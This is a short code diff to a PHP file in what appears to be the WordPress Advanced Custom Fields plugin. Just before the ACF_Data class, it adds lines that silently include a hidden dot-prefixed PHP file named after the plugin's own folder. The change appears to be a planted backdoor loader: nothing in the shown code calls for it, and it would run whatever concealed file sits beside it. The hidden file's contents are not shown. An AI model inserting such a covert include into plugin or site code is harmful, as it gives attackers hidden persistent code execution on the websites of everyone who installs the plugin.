@@ -4,6 +4,10 @@ if( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly.
 
 if( ! class_exists('ACF_Data') ) :
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class ACF_Data {
 	
 	/** @var string Unique identifier. */
